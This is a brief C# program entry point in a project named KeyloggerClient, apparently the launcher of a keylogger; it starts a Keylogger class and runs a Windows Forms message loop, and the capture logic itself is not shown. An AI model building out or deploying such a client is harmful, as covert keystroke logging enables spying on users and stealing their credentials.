using System;
using System.Windows.Forms;

namespace KeyloggerClient
{
    static class Program
    {
        static void Main(string[] args)
        {
            Keylogger.Start();
            Application.Run();
        }
    }
}
